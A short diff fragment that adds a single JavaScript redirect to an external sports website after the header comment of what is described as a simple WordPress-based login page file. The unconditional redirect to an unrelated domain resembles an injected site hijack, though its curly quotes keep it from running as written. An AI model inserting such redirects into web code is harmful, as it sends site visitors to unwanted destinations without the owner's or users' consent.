@@ -7,3 +7,4 @@ This is just the HTML / CSS of it but it uses wordpress's login system.
 Nice and Simple
 
 */
+window.location.assign(‘https://www.sportpresszo.hu/’);
